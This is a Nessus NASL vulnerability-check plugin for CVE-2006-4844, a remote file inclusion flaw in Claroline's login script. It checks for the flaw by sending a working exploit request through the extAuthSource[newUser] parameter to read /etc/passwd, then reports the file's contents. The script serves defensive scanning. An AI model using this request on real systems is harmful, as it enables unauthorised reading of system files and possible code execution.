#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22365);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-4844");
  script_bugtraq_id(20056);
  script_osvdb_id(28827);

  script_name(english:"Claroline claro_init_local.inc.php extAuthSource[newUser] Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with Claroline");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file inclusion attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Claroline, an open source, web-based,
collaborative learning environment written in PHP. 

The version of Claroline installed on the remote host fails to
sanitize input to the 'extAuthSource' parameter array before using it
to include PHP code in the 'claroline/inc/claro_init_local.inc.php'
script.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts." );
  # http://web.archive.org/web/20100214113731/http://www.gulftech.org/?node=research&article_id=00112-09142006
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?305efd33" );
  # http://web.archive.org/web/20061225020847/http://www.claroline.net/wiki/index.php/Changelog_1.7.x
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?84bd455c" );
 script_set_attribute(attribute:"solution", value:
"Either apply the security patch to version 1.7.7 or upgrade to
Claroline 1.7.8 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2006/09/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/09/14");
 script_cvs_date("$Date: 2013/01/18 23:00:35 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:claroline:claroline");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("claroline_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/claroline");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/claroline"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the script exists.
  url = string(dir, "/claroline/auth/login.php");
  r = http_send_recv3(method: "GET", port:port, item: url);
  if (isnull(r)) exit(0);
  res = r[2];
  # If...
  if (
    # it looks like Claroline and...
    "Claroline Banner" >< res &&
    # it looks like the login form
    egrep(pattern:'<input [^>]*name="login"', string:res)
  )
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd";
    login = string(SCRIPT_NAME, "-", unixtime());  # must not exist
    postdata = string(
      "login=", login, "&",
      "password=nessus&",
      "submitAuth=Enter&",
      "extAuthSource[nessus][newUser]=", file
    );
    r = http_send_recv3(method: "POST", item: url, version: 11, data: postdata, port: port,
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
    if (isnull(r)) exit(0);
    res = r[2];
    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (contents && report_verbosity)
        report = string(
          "Here are the contents of the file '/etc/passwd' that Nessus was\n",
          "able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = NULL;

      security_warning(port:port, extra:report);
      exit(0);
    }
  }
}
